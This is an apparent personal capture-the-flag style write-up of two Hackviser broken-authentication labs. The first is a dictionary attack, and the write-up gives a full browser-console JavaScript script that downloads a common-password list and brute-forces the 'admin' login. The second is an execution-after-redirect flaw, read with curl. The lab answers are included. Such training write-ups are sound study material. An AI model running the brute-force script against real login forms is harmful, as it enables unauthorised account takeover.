---
title: 'Broken Authentication'
date: '2026-05-30'
excerpt: 'Practice Broken Authentication attacks in multiple lab exercises.'
prog: 'Hackviser Web Application Security Labs  -  May 2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_brokenauth/brokenauth_hackviser_logo.png" alt="Hackviser logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">Broken Authentication</h1>
<div class="writeup-date">May 2026 &middot; Web Application Security Labs</div>
</div>
</div>
<p class="lead mb-4">Practice Broken Authentication attacks in multiple lab exercises.</p>

<h5 class="mb-2"><strong>1. Dictionary Attack</strong></h5>
<p class="mb-3">This lab contains a login form with weak login credentials. To complete the lab, find the password of "admin" user with a dictionary attack. What is the password of the admin user?</p>
<p class="mb-3">The web application shows a login form page.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_brokenauth/brokenauth_hackviser_image1.png" alt="Web Application Security Broken Auth 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">To solve this in browser console, we use the JavaScript exploit code below that gets the list of common passwords from SecLists, and bruteforce it.</p>

```javascript
(async () => {
    // URL to the raw top subset of rockyou.txt hosted on GitHub
    const wordlistUrl = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt";
    const targetUrl = window.location.href;
    
    console.log("[*] Streaming wordlist and launching silent dictionary attack...");

    try {
        const response = await fetch(wordlistUrl);
        const text = await response.text();
        const passwords = text.split("\n").map(p => p.trim()).filter(Boolean);

        for (let password of passwords) {
            const formData = new URLSearchParams();
            formData.append("username", "admin");
            formData.append("password", password);

            const loginResponse = await fetch(targetUrl, {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: formData.toString(),
                redirect: "manual"
            });

            // Clean, non-verbose success verification (Checks for a 302 Redirect or 0 Manual marker)
            if (loginResponse.status === 302 || loginResponse.status === 0) {
                console.log(`%c[+] SUCCESS! Found password: ${password}`, "color: green; font-weight: bold; font-size: 16px;");
                return;
            }
        }
        console.log("[-] Finished: Password not found in this wordlist tier.");
    } catch (err) {
        console.error("[!] Error running execution string:", err);
    }
})();
```

<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_brokenauth/brokenauth_hackviser_image2.png" alt="Web Application Security Broken Auth 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">We can see the POST requests sent and hit a success on the correct password. Logging in with the credentials discovered proves that the password is correct.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_brokenauth/brokenauth_hackviser_image3.png" alt="Web Application Security Broken Auth 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> superman</p>
<br />

<h5 class="mb-2"><strong>2. Execution After Redirect (EAR)</strong></h5>
<p class="mb-3">This lab contains a Execution After Redirect (EAR) vulnerability. To complete the lab, interrupt the web page loading before it redirects and read its content. What is the phone number of the user whose account was accessed without authorization?</p>
<p class="mb-3">We get another login form page. Checking the page source does not give us any hints on which page loads after a successful login of <code>login.php</code>, so we can safely assume that we do not have to brute force this lab's login page. Also, we can assume that the page of interest is simply <code>/</code>, which we can navigate to once we remove the word 'login.php' from the lab's URL. In the Network tab, we click on 'Preserve log', and navigate to <code>/</code>. We can see that it returns 302 Found for the GET request. However, we cannot view the response in the browser.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_brokenauth/brokenauth_hackviser_image4.png" alt="Web Application Security Broken Auth 4" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">We cannot view the response inside the browser because modern browser engines automatically follow <code>302 Found</code> redirects immediately in the background. Once the redirection is completed, the browser clears out and throws away the intermediate response body data from its UI cache to save memory, leaving us with a "Failed to load response data" error in the DevTools panel.</p>
<p class="mb-3">To bypass this browser limitation, we can use a simple <code>curl</code> command. Unlike a browser, <code>curl</code> acts as a raw network socket tracker; it prints out whatever data the server outputs first and does not follow redirection headers unless explicitly passed the <code>-L</code> flag. This allows us to capture the initial response body before the redirect happens.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_brokenauth/brokenauth_hackviser_image5.png" alt="Web Application Security Broken Auth 5" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_brokenauth/brokenauth_hackviser_image6.png" alt="Web Application Security Broken Auth 6" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> 705-491-1388</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab</a>.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">May 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>